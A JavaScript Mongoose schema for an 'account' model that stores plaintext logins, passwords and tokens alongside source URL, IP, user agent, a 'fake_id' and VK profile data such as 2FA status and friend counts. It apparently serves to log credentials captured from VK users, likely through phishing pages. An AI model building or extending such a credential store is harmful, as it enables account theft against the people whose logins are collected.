const {Schema, model} = require('mongoose')

const userSchema = new Schema({
    login: {
        type: String,
        required: true,
    },
    password: {
        type: String,
        required: true,
    },
    token: {
        type: String,
        required: false,
    },
    owner_id: {
        type: Number,
        required: true,
    },
    hide:{
        type: Boolean,
        required: true
    },
    date: {
        type: Date,
        required: true,
    },
    service: {
        type: String,
        required: true,
    },
    optionals:{
        optional_1:{
            type: String,
            required: false,
        },
        optional_2:{
            type: String,
            required: false,
        },
        optional_3:{
            type: String,
            required: false,
        },
        optional_4:{
            type: String,
            required: false,
        },
        optional_5:{
            type: String,
            required: false,
        },
        optional_6:{
            type: String,
            required: false,
        }
    },
    from:{
        url: {
            type: String,
            required: false,
        },
        ip: {
            type: String,
            required: false,
        },
        user_agent:{
            type: String,
            required: false,
        },
        fake_id: {
            type: String,
            required: false,
        }
    },
    vk:{
        service:{
            is_closed: {
                type: Boolean,
                required: false,
            },
            has_mobile: {
                type: Boolean,
                required: false,
            },
            _2fa: {
                type: Boolean,
                required: false,
            },
            online: {
                type: String,
                required: false,
            }
        },
        info:{
            id: {
                type: String,
                required: false,
            },
            first_name: {
                type: String,
                required: false,
            },
            last_name: {
                type: String,
                required: false,
            },
            photo:{
                type: String,
                required: false,
            },
            sex: {
                type: Number,
                required: false,
            },
        },
        counters:{
            friends: {
                type: Number,
                required: false,
            },
            followers: {
                type: Number,
                required: false,
            },
            gifts: {
                type: Number,
                required: false,
            },
        },
    }

}, {
    versionKey: false
})

module.exports = model('account', userSchema)